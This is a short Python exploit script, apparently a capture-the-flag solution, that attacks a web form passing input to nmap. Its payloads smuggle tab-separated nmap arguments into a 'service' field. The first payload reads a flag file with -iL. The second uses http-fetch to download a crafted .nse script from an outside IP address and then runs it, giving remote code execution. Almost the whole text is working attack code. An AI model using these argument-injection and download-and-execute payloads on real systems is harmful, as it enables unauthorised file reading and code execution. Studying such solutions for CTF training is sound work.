import sys
from bs4 import BeautifulSoup
import httpx

URL = sys.argv[1]

# ================================================
# Solution 1
# Use -iL for reading hosts and redirect the error to Stdout
# ================================================
payload = {
    'service': '18.198.77.177:11304\t-iL\t/flag-????????????????????????????????.txt\t-oN\t/dev/stdout'
}
r = BeautifulSoup(httpx.post(URL, data=payload).text, features="lxml").find_all('pre', {'class': 'result'})[0]
print(r)

# ================================================
# Solution 2
# Execute our crafted .nse to exfiltrate the flag 
# ================================================

# UPLOAD OUR .NSE SCRIPT
payload = {
    'service': '18.198.77.177:11304\t--script\thttp-fetch\t--script-args\thttp-fetch.destination=/tmp/,http-fetch.url=/flag.nse'
}
r = BeautifulSoup(httpx.post(URL, data=payload).text, features="lxml").find_all('pre', {'class': 'result'})[0]
print(r)

# EXECUTE OUR NSE
payload = {
    'service': '18.198.77.177:11304\t--script=/tmp/18.198.77.177/11304/flag'
}
r = BeautifulSoup(httpx.post(URL, data=payload).text, features="lxml").find_all('pre', {'class': 'result'})[0]
print(r)
